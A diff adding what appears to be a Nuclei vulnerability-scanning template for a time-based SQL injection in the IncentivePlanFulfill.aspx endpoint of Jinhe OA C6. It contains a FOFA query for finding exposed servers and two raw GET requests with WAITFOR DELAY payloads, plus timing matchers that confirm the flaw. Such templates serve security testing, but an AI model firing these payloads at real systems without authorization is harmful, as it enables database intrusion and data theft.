@@ -1,0 +1,29 @@
+id: jinheoa-sql-injection
+info:
+  name: "金和OA C6 IncentivePlanFulfill.aspx 文件存在 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+          金和OA C6 版本 IncentivePlanFulfill.aspx 接口存在 SQL 注入缺陷。攻击者可通过构造恶意SQL查询实现注入攻击，进而执行未授权的数据库操作，可能导致数据泄露、篡改或服务中断。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
+    Accept-Encoding: gzip
+  - |
+    GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:8%27--&TVersion=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
+    Accept-Encoding: gzip
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=6 && duration_1<=7
+    - duration_2>=8 && duration_2<=9
+    condition: and
